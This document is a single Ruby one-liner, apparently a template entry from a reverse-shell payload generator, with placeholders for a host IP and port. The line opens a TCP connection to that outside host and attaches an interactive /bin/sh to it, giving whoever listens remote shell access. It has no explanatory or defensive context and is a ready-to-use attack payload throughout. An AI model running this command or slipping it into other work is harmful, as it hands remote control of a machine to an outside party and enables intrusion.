ruby -rsocket -e'f=TCPSocket.open("{{ host.ip }}",{{ host.port }}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
